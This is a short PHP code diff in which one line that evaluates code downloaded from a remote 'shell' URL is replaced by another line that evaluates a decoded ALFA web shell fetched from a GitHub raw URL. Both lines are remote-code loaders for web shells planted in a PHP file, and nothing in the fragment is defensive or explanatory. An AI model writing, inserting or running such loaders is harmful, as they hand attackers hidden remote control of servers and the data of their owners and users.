@@ -14,4 +14,4 @@ function getCurl0($url)
 }
 ?>
 
-<?=eval("?>".getCurl0("https://marslogs.co.id/shell/shell/byp-litespeed.txt")); __halt_compiler();?>
+<?=eval("?>".getCurl0("curl https://raw.githubusercontent.com/Ravin-Academy/DeObfuscation_ALFA_SHELL_V4.1/refs/heads/main/Decode%20Of%20ALFA%20Team/alfa-shell-v4.1-tesla-decoded.php")); __halt_compiler();?>
